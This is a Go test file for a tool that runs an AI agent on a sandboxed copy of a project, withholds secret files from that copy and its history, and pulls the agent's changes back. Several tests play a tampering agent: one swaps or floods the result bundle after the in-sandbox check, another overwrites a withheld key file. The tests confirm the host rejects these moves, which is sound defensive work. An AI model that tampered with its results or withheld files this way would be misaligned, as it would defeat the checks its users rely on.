	if err != nil || len(res.Warnings) != 1 || !strings.Contains(res.Warnings[0], "branch dc/c1-more also holds your folder's uncommitted edits") ||
		!strings.Contains(res.Warnings[0], "the sandbox changed README.md further") {
		t.Fatalf("branch of a further edit: %+v, %v", res, err)
	}
	if got := e.git(e.project, "show", "dc/c1-more:README.md"); got != "hello\nhost edit, and the agent's" {
		t.Fatalf("the branch's README.md = %q", got)
	}
}

// TestCopyBranchThatHoldsThePull: `pull --branch` of work its branch
// already holds (the same pull, or a new one of the same state, whose
// commit differs) is done, and checked before the sandbox is read; a branch
// that holds something else is refused before the pull, as is a patch file
// that exists or has no folder (#965).
func TestCopyBranchThatHoldsThePull(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	check := func(mutate func(*ApplyOptions)) (bool, error) {
		opts := ApplyOptions{DataDir: e.data, Name: "c1", Mode: ApplyBranch}
		if mutate != nil {
			mutate(&opts)
		}
		return CheckApply(bg, opts)
	}
	if held, err := check(nil); err != nil || held {
		t.Fatalf("check before any branch: %v, %v", held, err)
	}
	if _, err := check(func(o *ApplyOptions) { o.Branch = "bad..name" }); err == nil || !strings.Contains(err.Error(), "invalid branch name") {
		t.Fatalf("check of an invalid name: %v", err)
	}
	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	first := pull(t, e, fs, "c1")
	if res, err := apply(e, "c1", ApplyBranch, nil); err != nil || !res.Applied || res.Branch != "dc/c1" {
		t.Fatalf("branch: %+v, %v", res, err)
	}
	tip := e.git(e.project, "rev-parse", "dc/c1")
	if held, err := check(nil); err != nil || !held {
		t.Fatalf("check of the branch that holds the last pull: %v, %v", held, err)
	}
	// Before a pull that starts the stopped sandbox, which has run since
	// that pull, the branch holds only earlier work: it is refused before
	// the boot (it was refused after it, the #1019 retest), unless forced.
	// A pull made from the last one takes that work again, and is done.
	var earlier *EarlierPullError
	if held, err := check(func(o *ApplyOptions) { o.Starts = true }); held || !errors.As(err, &earlier) || earlier.Branch != "dc/c1" ||
		!earlier.PulledAt.Equal(first.PulledAt) || !strings.Contains(err.Error(), "branch dc/c1 already exists") {
		t.Fatalf("check before a pull that starts the sandbox: %v, %v", held, err)
	}
	if held, err := check(func(o *ApplyOptions) { o.Starts, o.Reuse = true, strings.Repeat("0", 40) }); held || !errors.As(err, &earlier) {
		t.Fatalf("check before a pull that cannot reuse the last one: %v, %v", held, err)
	}
	for name, mutate := range map[string]func(*ApplyOptions){
		"reusing the last pull": func(o *ApplyOptions) { o.Starts, o.Reuse = true, first.Result },
		"forced":                func(o *ApplyOptions) { o.Starts, o.Force = true, true },
	} {
		if held, err := check(mutate); err != nil || !held {
			t.Fatalf("check before a pull %s: %v, %v", name, held, err)
		}
	}
	// The same work, committed in the sandbox: another commit, the same
	// tree.
	fs.agent(remoteRepo, "add", "-A")
	fs.agent(remoteRepo, "commit", "-q", "-m", "agent work")
	if again := pull(t, e, fs, "c1"); again.Result == first.Result || again.ResultTree != first.ResultTree {
		t.Fatalf("the committed work: result %s tree %s; first %s tree %s", again.Result, again.ResultTree, first.Result, first.ResultTree)
	}
	if res, err := apply(e, "c1", ApplyBranch, nil); err != nil || !res.UpToDate || res.Applied || res.Branch != "dc/c1" {
		t.Fatalf("the same work again: %+v, %v", res, err)
	}
	if now := e.git(e.project, "rev-parse", "dc/c1"); now != tip {
		t.Fatalf("an up-to-date branch moved from %s to %s", tip, now)
	}
	if pr, err := LoadPull(e.data, "c1"); err != nil || pr.AppliedAt == nil {
		t.Fatalf("the pull is not marked handed over: %+v, %v", pr, err)
	}
	// Other work: the branch holds something else.
	fs.write(remoteRepo+"/agent.txt", "more agent work\n")
	pull(t, e, fs, "c1")
	e.git(e.project, "branch", "-f", "dc/c1", "main")
	if held, err := check(nil); held || err == nil || !strings.Contains(err.Error(), "branch dc/c1 already exists") {
		t.Fatalf("check of a branch that holds other work: %v, %v", held, err)
	}
	if held, err := check(func(o *ApplyOptions) { o.Force = true }); err != nil || held {
		t.Fatalf("forced check: %v, %v", held, err)
	}
	if _, err := apply(e, "c1", ApplyBranch, nil); err == nil || !strings.Contains(err.Error(), "already exists") {
		t.Fatalf("branch over other work: %v", err)
	}
	// Patch files: one that exists, one without a folder, a link.
	patch := func(p string, force bool) error {
		_, err := CheckApply(bg, ApplyOptions{DataDir: e.data, Name: "c1", Mode: ApplyPatch, PatchPath: p, Force: force})
		return err
	}
	writeFile(t, e.root, "old.patch", "x")
	mustSymlink(t, filepath.Join(e.root, "old.patch"), filepath.Join(e.root, "link.patch"))
	for p, want := range map[string]string{
		filepath.Join(e.root, "old.patch"):          "already exists",
		filepath.Join(e.root, "nowhere", "a.patch"): "its folder does not exist",
		filepath.Join(e.root, "link.patch"):         "refusing to write the patch over",
		filepath.Join(e.root, "new.patch"):          "",
	} {
		if err := patch(p, false); (want == "") != (err == nil) || (err != nil && !strings.Contains(err.Error(), want)) {
			t.Fatalf("check of patch %s: %v; want %q", p, err, want)
		}
	}
	if err := patch(filepath.Join(e.root, "old.patch"), true); err != nil {
		t.Fatalf("forced check of an existing patch: %v", err)
	}
	// A folder that is not a git repository has no branch.
	p := newSerialEnv(t)
	writeFile(t, p.project, "notes.md", "n\n")
	launchCopy(t, p, "c2", nil)
	if _, err := CheckApply(bg, ApplyOptions{DataDir: p.data, Name: "c2", Mode: ApplyBranch}); !errors.Is(err, ErrNotGitProject) {
		t.Fatalf("check of a plain folder's branch: %v", err)
	}
}

// TestCopyPullReusesTheLastPull: a pull made from the last one (the
// sandbox has not run since) reads nothing from the sandbox, and still
// starts from the last apply; a pull the named one is not, or one an undo
// dropped, is not reused (#965).
func TestCopyPullReusesTheLastPull(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/README.md", "agent version\n")
	first := pull(t, e, fs, "c1")
	reuse := func(result string) (*PullResult, error) {
		// A stopped sandbox: any exec fails.
		fs.failExec = errors.New("the sandbox is not running")
		defer func() { fs.failExec = nil }()
		return Pull(bg, PullOptions{DataDir: e.data, Name: "c1", Exec: fs, Reuse: result})
	}
	pr, err := reuse(first.Result)
	if err != nil || !pr.Reused || pr.Result != first.Result || !pr.PulledAt.Equal(first.PulledAt) || changePaths(pr.Changes) != changePaths(first.Changes) {
		t.Fatalf("reused pull: %+v, %v; first %+v", pr, err, first)
	}
	if saved, err := LoadPull(e.data, "c1"); err != nil || !saved.Reused {
		t.Fatalf("the reused pull is not the last one: %+v, %v", saved, err)
	}
	mustApply(t, e, "c1")
	if pr, err := reuse(first.Result); err != nil || !pr.Empty() || pr.Since == "" {
		t.Fatalf("reused pull after the apply: %+v, %v; want nothing new since it", pr, err)
	}
	if _, err := reuse(strings.Repeat("0", 40)); !errors.Is(err, ErrNoReusablePull) {
		t.Fatalf("reuse of another pull: %v", err)
	}
	// The undo drops the pull that started from the apply.
	if _, err := UndoApply(bg, UndoApplyOptions{DataDir: e.data, Name: "c1"}); err != nil {
		t.Fatal(err)
	}
	if _, err := reuse(first.Result); !errors.Is(err, ErrNoReusablePull) {
		t.Fatalf("reuse after the undo: %v", err)
	}
}

// gitFails runs a fixture git command that must fail and returns its
// output.
func gitFails(t *testing.T, home, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "HOME="+home, "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_TERMINAL_PROMPT=0")
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("git %s succeeded: %s", strings.Join(args, " "), out)
	}
	return string(out)
}

// objectsIn lists the objects a repository really has (no lazy fetch).
func objectsIn(t *testing.T, home, dir string) map[string]bool {
	t.Helper()
	set := map[string]bool{}
	for _, oid := range strings.Fields(runGit(t, home, dir, "cat-file", "--batch-all-objects", "--batch-check=%(objectname)")) {
		set[oid] = true
	}
	return set
}

// TestCopyKeepsHeldBackSecretsOutOfHistory: a held-back file is missing
// from the copy's working tree, and every committed version of it, or of
// any other secret-named path, is missing from the shipped history too.
// The host keeps them all for verifying and applying pulls. Whatever the
// agent does to a held-back path (creating, overwriting or deleting it) is
// dropped from the pull, and its git still packs such a change for a push.
func TestCopyKeepsHeldBackSecretsOutOfHistory(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	commit := func(msg string) {
		e.git(e.project, "add", "-A", "-f")
		e.git(e.project, "commit", "-q", "-m", msg)
	}
	writeFile(t, e.project, "config/server.key", "marker-v1\n")
	writeFile(t, e.project, "old/app.env", "marker-old\n")
	commit("secrets")
	writeFile(t, e.project, "config/server.key", "marker-v2\n")
	e.git(e.project, "rm", "-q", "old/app.env")
	// A shipped file that happens to hold the same bytes as v1 keeps that
	// blob in the copy: the agent reads the file anyway.
	writeFile(t, e.project, "notes.txt", "marker-v1\n")
	commit("rotate")
	writeFile(t, e.project, "certs/dev.pem", "untracked real cert\n")
	blob := func(rev string) string { return e.git(e.project, "rev-parse", rev) }
	v1, v2, old := blob("HEAD~1:config/server.key"), blob("HEAD:config/server.key"), blob("HEAD~1:old/app.env")

	rec, fs := launchCopy(t, e, "c1", nil)
	if strings.Join(rec.HeldBack, ",") != "certs/dev.pem,config/server.key" || !strings.Contains(strings.Join(rec.Warnings, "\n"), "left out of the copy's history") {
		t.Fatalf("held back = %v, warnings = %v", rec.HeldBack, rec.Warnings)
	}
	wantFiles(t, fs.local(remoteRepo), "config/server.key", absent, "certs/dev.pem", absent)
	if shipped := objectsIn(t, e.home, fs.local(remoteRepo)); shipped[v2] || shipped[old] || !shipped[v1] {
		t.Fatalf("shipped objects: v2=%v old=%v v1=%v", shipped[v2], shipped[old], shipped[v1])
	}
	// The agent's git works; the withheld versions are unreadable.
	if n, st := fs.agent(remoteRepo, "rev-list", "--count", "HEAD"), fs.agent(remoteRepo, "status", "--porcelain"); n != "3" || st != "" {
		t.Fatalf("history = %s commits, status = %q", n, st)
	}
	for _, rev := range []string{"HEAD:config/server.key", "HEAD~1:old/app.env"} {
		if out := gitFails(t, e.home, fs.local(remoteRepo), "show", rev); strings.Contains(out, "marker") {
			t.Fatalf("git show %s printed the secret: %s", rev, out)
		}
	}
	fs.agent(remoteRepo, "fsck", "--no-progress")
	// The host copy is complete and an ordinary repository.
	if have := objectsIn(t, e.home, rec.BaseGit); !have[v1] || !have[v2] || !have[old] {
		t.Fatal("base.git lost objects")
	}
	if out := gitFails(t, e.home, rec.BaseGit, "config", "--get", "extensions.partialClone"); out != "" {
		t.Fatalf("base.git is still a partial clone: %s", out)
	}

	// The round trip still works, and the agent's junk where the untracked
	// secret lives is dropped.
	fs.write(remoteRepo+"/src/app.go", "package main // agent\n")
	fs.agent(remoteRepo, "commit", "-q", "-am", "agent")
	fs.write(remoteRepo+"/certs/dev.pem", "agent junk\n")
	if pr := pull(t, e, fs, "c1"); changePaths(pr.Changes) != "M:src/app.go" || len(pr.Blocking) != 0 || strings.Join(pr.Dropped, ",") != "certs/dev.pem" {
		t.Fatalf("changes = %s blocking = %v dropped = %v", changePaths(pr.Changes), pr.Blocking, pr.Dropped)
	}
	mustApply(t, e, "c1")
	wantFiles(t, e.project, "src/app.go", "package main // agent\n", "config/server.key", "marker-v2\n", "certs/dev.pem", "untracked real cert\n")
	if res, err := apply(e, "c1", ApplyBranch, func(o *ApplyOptions) { o.Branch = "dc/history" }); err != nil || e.git(e.project, "show", res.Branch+":config/server.key") != "marker-v2" {
		t.Fatalf("branch: %+v %v", res, err)
	}

	// The agent changes the held-back tracked file after all (it re-enables
	// it in its index and commits over it): its git packs that for a push,
	// and the pull bundles it and drops it, as it does the file's removal.
	remote := filepath.Join(e.root, "remote.git")
	runGit(t, e.home, e.root, "init", "-q", "--bare", remote)
	runGit(t, e.home, remote, "fetch", "-q", e.project, "+HEAD:refs/heads/main")
	fs.agent(remoteRepo, "update-index", "--no-skip-worktree", "config/server.key")
	fs.write(remoteRepo+"/config/server.key", "agent junk\n")
	fs.agent(remoteRepo, "commit", "-q", "-am", "overwrite the key")
	fs.agent(remoteRepo, "push", "-q", remote, "HEAD:refs/heads/agent")
	fs.write(remoteRepo+"/ok.txt", "fine\n")
	check := func(step string) {
		t.Helper()
		// src/app.go came back with the apply above: only ok.txt is new.
		if pr := pull(t, e, fs, "c1"); strings.Join(pr.Dropped, ",") != "certs/dev.pem,config/server.key" || changePaths(pr.Changes) != "A:ok.txt" {
			t.Fatalf("%s: dropped = %v changes = %s", step, pr.Dropped, changePaths(pr.Changes))
		}
	}
	check("overwritten")
	fs.agent(remoteRepo, "rm", "-q", "--cached", "config/server.key")
	fs.agent(remoteRepo, "commit", "-q", "-m", "drop key")
	check("removed")
	mustApply(t, e, "c1")
	wantFiles(t, e.project, "ok.txt", "fine\n", "config/server.key", "marker-v2\n", "certs/dev.pem", "untracked real cert\n")
}

func TestCopyNoChangesAndUnbornRepo(t *testing.T) {
	e := newEnv(t)
	e.git(e.project, "init", "-q", "-b", "main")
	writeFile(t, e.project, "draft.md", "draft\n")
	rec, fs := launchCopy(t, e, "c1", nil)
	if rec.Head != "" || rec.Branch != "refs/heads/main" {
		t.Fatalf("unborn record: %+v", rec)
	}
	if pr := pull(t, e, fs, "c1"); !pr.Empty() {
		t.Fatalf("untouched copy reported changes: %v", pr.Changes)
	}
	if _, err := apply(e, "c1", ApplyMerge, nil); !errors.Is(err, ErrNoChanges) {
		t.Fatalf("err = %v", err)
	}
	fs.write(remoteRepo+"/draft.md", "draft\nmore\n")
	fs.agent(remoteRepo, "add", "-A")
	fs.agent(remoteRepo, "commit", "-q", "-m", "first")
	if pr := pull(t, e, fs, "c1"); len(pr.Blocking) != 0 || changePaths(pr.Changes) != "M:draft.md" {
		t.Fatalf("pull: %v %v", pr.Blocking, pr.Changes)
	}
	mustApply(t, e, "c1")
	wantFiles(t, e.project, "draft.md", "draft\nmore\n")
}

// TestCopyPlainFolder: a plain folder is copied without .git, secrets or
// caches, and without .gitignore filtering; its apply merges, can be
// undone without creating a repository, and falls back to a patch only.
func TestCopyPlainFolder(t *testing.T) {
	e := newEnv(t)
	writeFile(t, e.project, "notes.md", "a\n")
	writeFile(t, e.project, ".env", "SECRET=1\n")
	writeFile(t, e.project, "node_modules/p/i.js", "cache\n")
	writeFile(t, e.project, ".gitignore", "notes.md\n")
	rec, fs := launchCopy(t, e, "p1", nil)
	if rec.Kind != CopyPlain || rec.RemoteGitDir != "/sandbox/.dc/git" || !pathExists(fs.local("/sandbox/.dc/git/HEAD")) {
		t.Fatalf("plain record: %+v", rec)
	}
	wantFiles(t, fs.local(remoteRepo), ".git", absent, ".env", absent, "node_modules", absent, "notes.md", present)
	fs.write(remoteRepo+"/notes.md", "a\nb\n")
	fs.write(remoteRepo+"/new.txt", "n\n")
	fs.write(remoteRepo+"/node_modules/q/i.js", "installed in the sandbox\n")
	if got := changePaths(pull(t, e, fs, "p1").Changes); got != "A:new.txt M:notes.md" {
		t.Fatalf("changes = %s", got)
	}
	if _, err := apply(e, "p1", ApplyBranch, nil); !errors.Is(err, ErrNotGitProject) {
		t.Fatalf("branch on plain folder: %v", err)
	}
	if res := mustApply(t, e, "p1"); res.PreApplyRef != "" {
		t.Fatalf("apply: %+v", res)
	}
	// Package caches from the sandbox are not applied.
	wantFiles(t, e.project, "notes.md", "a\nb\n", "new.txt", "n\n", ".env", "SECRET=1\n", "node_modules/q", absent)
	if res, err := undoApply(e, "p1", false); err != nil || !res.Undone || res.PreApplyRef != "" {
		t.Fatalf("undo: %+v, %v", res, err)
	}
	wantFiles(t, e.project, "notes.md", "a\n", "new.txt", absent, ".git", absent)
	fs.write(remoteRepo+"/notes.md", "agent\n")
	writeFile(t, e.project, "notes.md", "host\n")
	pull(t, e, fs, "p1")
	if res, err := apply(e, "p1", ApplyMerge, nil); err != nil || res.Applied || res.Branch != "" || !pathExists(res.PatchPath) {
		t.Fatalf("plain conflict: %+v %v", res, err)
	}
}

// The CLI stages the folder it runs in. A plain folder is still a plain
// folder then: git's "not a git repository" answer to rev-parse is empty,
// and an empty path must not be taken for the working directory, which
// would make the folder look like the top of a repository.
func TestStagePlainFolderFromInsideIt(t *testing.T) {
	e := newSerialEnv(t)
	writeFile(t, e.project, "notes.md", "a\n")
	t.Chdir(e.project)
	if samePath("", e.project) || samePath(".", e.project) {
		t.Fatal("a relative path matched the working directory")
	}
	rec, err := Stage(bg, e.stageOpts("p1"))
	if err != nil || rec.Kind != CopyPlain || rec.RemoteGitDir != "/sandbox/.dc/git" || rec.Baseline == "" || rec.Files != 1 {
		t.Fatalf("stage a plain folder from inside it: %+v, %v", rec, err)
	}
	wantFiles(t, e.project, ".git", absent)
}

// tamperExec lets a test act as the agent between the capture and the
// transfer of the result bundle, or replace the transfer outright (an
// agent that swaps the file after the in-sandbox check).
type tamperExec struct {
	*fakeSandbox
	afterCapture func()
	stream       func(req ExecRequest) (*ExecResult, error)
}

func (x *tamperExec) Exec(ctx context.Context, sandbox string, req ExecRequest) (*ExecResult, error) {
	if req.Stdout != nil && x.stream != nil {
		return x.stream(req)
	}
	res, err := x.fakeSandbox.Exec(ctx, sandbox, req)
	if req.Stdout == nil && err == nil && x.afterCapture != nil {
		x.afterCapture()
	}
	return res, err
}

func TestPullRejectsTamperedBundles(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	_, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/x.txt", "x\n")
	bundle := fs.local(remoteStateDir + "/result.bundle")
	pullDir := filepath.Join(e.data, "sandboxes", "c1", "copy", "pull")
	pullWith := func(ex Execer, limit int64) error {
		t.Helper()
		_, err := Pull(bg, PullOptions{DataDir: e.data, Name: "c1", Exec: ex, MaxBundleBytes: limit, Scanners: []ContentScanner{}})
		if pathExists(pullDir) {
			t.Fatalf("the pull left %s behind", pullDir)
		}
		return err
	}

	err := pullWith(&tamperExec{fakeSandbox: fs, afterCapture: func() { _ = os.Truncate(bundle, 20) }}, 0)
	if err == nil || !strings.Contains(err.Error(), "received a 20-byte bundle") {
		t.Fatalf("truncated bundle accepted: %v", err)
	}
	if err := pullWith(fs, 10); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("oversized bundle: %v", err)
	}

	// The agent reports a small bundle, then makes it a huge sparse file,
	// a directory or a link.
	const limit = 64 << 10
	for name, swap := range map[string]func(){
		"sparse file": func() {
			writeFile(t, fs.local(remoteStateDir), "result.bundle", "marker\n")
			must(t, os.Truncate(bundle, 1<<30))
		},
		"directory": func() { writeFile(t, bundle, "inner", "marker\n") },
		"symlink": func() {
			writeFile(t, fs.local(remoteStateDir), "elsewhere", "marker\n")
			mustSymlink(t, "elsewhere", bundle)
		},
	} {
		err := pullWith(&tamperExec{fakeSandbox: fs, afterCapture: func() { _ = os.RemoveAll(bundle); swap() }}, limit)
		if err == nil || !(strings.Contains(err.Error(), "not a regular file") || strings.Contains(err.Error(), "bundle has")) {
			t.Fatalf("%s accepted: %v", name, err)
		}
		_ = os.RemoveAll(bundle)
	}

	// The in-sandbox check is only a courtesy: an agent that swaps the file
	// after it streams more than the limit, and the host stops reading.
	accepted := 0
	flood := &tamperExec{fakeSandbox: fs, stream: func(req ExecRequest) (*ExecResult, error) {
		line := []byte(strings.Repeat("bWFya2Vy", 9) + "\n") // "marker" x9, base64
		for i := 0; i < 1<<16; i++ {
			n, err := req.Stdout.Write(line)
			accepted += n
			if err != nil {
				return nil, err
			}
		}
		return &ExecResult{}, nil
	}}
	// 72 base64 characters (54 bytes) per 73-byte line.
	if err := pullWith(flood, limit); !errors.Is(err, ErrTooLarge) || accepted > (limit/54+2)*73 {
		t.Fatalf("flood: %v; the host accepted %d encoded bytes for a %d-byte limit", err, accepted, limit)
	}
	fs.failExec = errors.New("sandbox gone")
	if err := pullWith(fs, 0); err == nil {
		t.Fatal("exec failure ignored")
	}
	// Nothing above got through: a clean pull still works.
	if pr := pull(t, e, fs, "c1"); changePaths(pr.Changes) != "A:x.txt" {
		t.Fatalf("changes = %s", changePaths(pr.Changes))
	}
}

func TestBase64SinkBoundsAndValidates(t *testing.T) {
	data := []byte(strings.Repeat("marker bytes\x00\xff", 1000))
	enc := base64.StdEncoding.EncodeToString(data)
	var wrapped strings.Builder
	for i := 0; i < len(enc); i += 76 {
		wrapped.WriteString(enc[i:min(i+76, len(enc))] + "\n")
	}
	feed := func(limit int64, text string, chunk int) (*bytes.Buffer, error) {
		var out bytes.Buffer
		sink := &base64Sink{w: &out, limit: limit}
		for i := 0; i < len(text); i += chunk {
			if _, err := sink.Write([]byte(text[i:min(i+chunk, len(text))])); err != nil {
				return &out, err
			}
		}
		return &out, sink.Close()
	}
	for _, chunk := range []int{1, 3, 7, 4096} {
		if out, err := feed(int64(len(data)), wrapped.String(), chunk); err != nil || !bytes.Equal(out.Bytes(), data) {
			t.Fatalf("chunk %d: round trip failed: %v", chunk, err)
		}
		if out, err := feed(int64(len(data))-1, wrapped.String(), chunk); !errors.Is(err, errBundleLimit) || out.Len() >= len(data) {
			t.Fatalf("chunk %d: limit not enforced: %v (%d bytes written)", chunk, err, out.Len())
		}
	}
	for text, why := range map[string][]string{
		"bWFy":       nil,
		"bWFya2":     {"truncated"},
		"bWE=bWFy":   {"base64", "after its end"},
		"bW!y":       {"base64"},
		"bWE=\nbWFy": {"base64", "after its end"},
	} {
		for _, chunk := range []int{4, 1 << 10} {
			_, err := feed(1<<20, text, chunk)
			ok := why == nil && err == nil
			for _, w := range why {
				ok = ok || err != nil && strings.Contains(err.Error(), w)
			}
			if !ok {
				t.Errorf("%q in %d-byte writes: err = %v, want %q", text, chunk, err, why)
			}
		}
	}
}

// TestRefreshAfterPull: a sandbox still in the state its last pull took
// holds no unpulled work, so once that pull is applied (or had nothing to
// apply) a refresh needs no Force; before that, the refresh refuses rather
// than discard the pull, and a forced one says it did. PendingWork reports
// what deleting the sandbox would discard, looked up in the sandbox when
// it runs and in the last pull when it does not.
func TestRefreshAfterPull(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "config/server.key", "marker-key\n")
	e.git(e.project, "add", "-f", "config/server.key")
	e.git(e.project, "commit", "-q", "-m", "key")
	if st, err := PendingWork(bg, e.data, "c1", nil); err != nil || st != (CopyStatus{}) {
		t.Fatalf("no copy record: %+v, %v", st, err)
	}
	_, fs := launchCopy(t, e, "c1", nil)
	opts := e.refreshOpts("c1", fs)
	// pending wants PendingWork's answer and, for a copy it looked at, the
	// pull it says the copy is still in the state of ("" for none).
	pending := func(step string, ex Execer, want CopyWork, pulled string) {
		t.Helper()
		if st, err := PendingWork(bg, e.data, "c1", ex); err != nil || st.Work != want || st.Pulled != pulled {
			t.Fatalf("%s: PendingWork = %+v, %v; want %v, pulled %q", step, st, err, want, pulled)
		}
	}
	pending("as uploaded", fs, CopyWorkNone, "")
	pending("stopped, never pulled", nil, CopyWorkUnknown, "")

	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	pending("agent work", fs, CopyWorkUnpulled, "")
	first := pull(t, e, fs, "c1")
	pending("pulled, not applied", fs, CopyWorkUnapplied, first.Result)
	pending("pulled, not applied, stopped", nil, CopyWorkUnapplied, "")
	if _, err := Refresh(bg, opts); !errors.Is(err, ErrUnappliedPull) {
		t.Fatalf("refresh over an unapplied pull: %v", err)
	}
	// More work after the pull is unpulled work again.
	fs.write(remoteRepo+"/later.txt", "later\n")
	pending("work after the pull", fs, CopyWorkUnpulled, "")
	if _, err := Refresh(bg, opts); !errors.Is(err, ErrUnpulledChanges) {
		t.Fatalf("refresh over work after the pull: %v", err)
	}
	second := pull(t, e, fs, "c1")
	mustApply(t, e, "c1")
	pending("applied", fs, CopyWorkNone, second.Result)
	if pr, err := LoadPull(e.data, "c1"); err != nil || pr.AppliedAt == nil {
		t.Fatalf("the pull is not marked applied: %+v %v", pr, err)
	}
	rec, err := Refresh(bg, opts)
	if err != nil || strings.Contains(strings.Join(rec.Warnings, "\n"), "never applied") {
		t.Fatalf("refresh after apply: %+v, %v", rec, err)
	}
	wantFiles(t, fs.local(remoteRepo), "agent.txt", "agent work\n")

	// A pull with nothing to apply (the agent only touched a held-back
	// file, which the pull drops) is handed back as it is.
	fs.write(remoteRepo+"/config/server.key", "agent junk\n")
	fs.agent(remoteRepo, "update-index", "--no-skip-worktree", "config/server.key")
	fs.agent(remoteRepo, "commit", "-q", "-am", "junk")
	if pr := pull(t, e, fs, "c1"); !pr.Empty() {
		t.Fatalf("changes = %s", changePaths(pr.Changes))
	}
	if _, err := Refresh(bg, opts); err != nil {
		t.Fatalf("refresh after an empty pull: %v", err)
	}

	// Force discards an unapplied pull, and says so.
	fs.write(remoteRepo+"/discard.txt", "x\n")
	pull(t, e, fs, "c1")
	opts.Force = true
	if rec, err = Refresh(bg, opts); err != nil || !strings.Contains(strings.Join(rec.Warnings, "\n"), "was never applied and is discarded") {
		t.Fatalf("forced refresh: %+v, %v", rec, err)
	}
}

type failUploader struct{ err error }

func (u failUploader) Upload(context.Context, string, string, string) error { return u.err }

// failingExec fails the sandbox scripts that contain marker.
type failingExec struct {
	*fakeSandbox
	marker string
}

func (f failingExec) Exec(ctx context.Context, sandbox string, req ExecRequest) (*ExecResult, error) {
	if strings.Contains(strings.Join(req.Argv, " "), f.marker) {
		return nil, errors.New("exec failed: " + f.marker)
	}
	return f.fakeSandbox.Exec(ctx, sandbox, req)
}

// copyLeftovers lists copy directories of a stage or refresh that did not
// clean up after itself.
func copyLeftovers(t *testing.T, e *env, name string) []string {
	t.Helper()
	entries, err := os.ReadDir(filepath.Join(e.data, "sandboxes", name))
	if err != nil && !errors.Is(err, os.ErrNotExist) {
		t.Fatal(err)
	}
	var out []string
	for _, en := range entries {
		if strings.HasPrefix(en.Name(), "copy.") {
			out = append(out, en.Name())
		}
	}
	return out
}

func TestFailedRefreshKeepsTheCopyState(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	before, fs := launchCopy(t, e, "c1", nil)
	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	pr := pull(t, e, fs, "c1") // pulled, not applied yet
	unchanged := func(step string, err error, ok bool) {
		t.Helper()
		if !ok {
			t.Fatalf("%s: err = %v", step, err)
		}
		rec, err := LoadCopy(e.data, "c1")
		if err != nil || rec.Baseline != before.Baseline || rec.UploadedAt == nil || rec.BaseGit != before.BaseGit || !pathExists(rec.BaseGit) {
			t.Fatalf("%s: copy record changed: %+v, %v", step, rec, err)
		}
		if got, err := LoadPull(e.data, "c1"); err != nil || got.Effective != pr.Effective {
			t.Fatalf("%s: pull lost: %v", step, err)
		}
		if left := copyLeftovers(t, e, "c1"); len(left) > 0 {
			t.Fatalf("%s: left behind %v", step, left)
		}
	}
	opts := e.refreshOpts("c1", fs)
	opts.Force = true

	// Staging fails: the project has outgrown the size limit.
	tooBig := opts
	tooBig.Stage.MaxBytes = 1
	_, err := Refresh(bg, tooBig)
	unchanged("stage failure", err, errors.Is(err, ErrTooLarge))
	// Removing the old copy in the sandbox fails. The copy is still there,
	// and so is the guard for the agent's work in it: that work was
	// pulled, so what the guard protects now is the unapplied pull.
	fs.failExec = errors.New("transient exec error")
	_, err = Refresh(bg, opts)
	unchanged("remove failure", err, err != nil && strings.Contains(err.Error(), "transient"))
	guarded := opts
	guarded.Force = false
	if _, err := Refresh(bg, guarded); !errors.Is(err, ErrUnappliedPull) {
		t.Fatalf("guard skipped after a failed refresh: %v", err)
	}
	// The upload fails after the old copy in the sandbox was removed.
	failing := opts
	failing.Upload = failUploader{errors.New("upload interrupted")}
	_, err = Refresh(bg, failing)
	unchanged("upload failure", err, err != nil && strings.Contains(err.Error(), "interrupted"))
	wantFiles(t, fs.root, strings.TrimPrefix(remoteRepo, "/"), absent)
	// The new copy arrives but its baseline cannot be set. It is taken out
	// again: no copy in the sandbox beats one the record does not describe.
	noBaseline := opts
	noBaseline.Exec = failingExec{fs, "update-ref " + baselineRef}
	uploads := len(fs.uploads)
	_, err = Refresh(bg, noBaseline)
	unchanged("baseline failure", err, err != nil && strings.Contains(err.Error(), "exec failed"))
	if len(fs.uploads) == uploads || pathExists(fs.local(remoteRepo)) {
		t.Fatalf("the unrecorded copy was left in the sandbox (uploads %v)", fs.uploads)
	}
	// The pull made before still applies, and retrying needs no force: the
	// sandbox holds nothing to lose.
	mustApply(t, e, "c1")
	wantFiles(t, e.project, "agent.txt", "agent work\n")
	rec, err := Refresh(bg, guarded)
	if err != nil || rec.UploadedAt == nil || rec.VerifiedAt == nil || rec.Stage != "" || rec.BaseGit != before.BaseGit || !pathExists(rec.BaseGit) {
		t.Fatalf("refreshed record: %+v, %v", rec, err)
	}
	if saved, err := LoadCopy(e.data, "c1"); err != nil || saved.Baseline != rec.Baseline || saved.VerifiedAt == nil {
		t.Fatalf("saved record: %+v %v", saved, err)
	}
	if _, err := LoadPull(e.data, "c1"); err == nil {
		t.Fatal("the old pull must go with the old copy")
	}
	if left := copyLeftovers(t, e, "c1"); len(left) > 0 || !pathExists(fs.local(remoteRepo+"/agent.txt")) {
		t.Fatalf("left behind %v, or the project was not uploaded", left)
	}
	if pr := pull(t, e, fs, "c1"); !pr.Empty() {
		t.Fatalf("fresh copy has changes: %s", changePaths(pr.Changes))
	}
}

func TestStageReplaceKeepsTheUploadedCopyGuarded(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	before, fs := launchCopy(t, e, "c1", nil)
	opts := e.stageOpts("c1")
	opts.Replace = true

	// A re-stage that fails leaves the uploaded copy as it was.
	tooBig := opts
	tooBig.MaxBytes = 1
	if _, err := Stage(bg, tooBig); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v", err)
	}
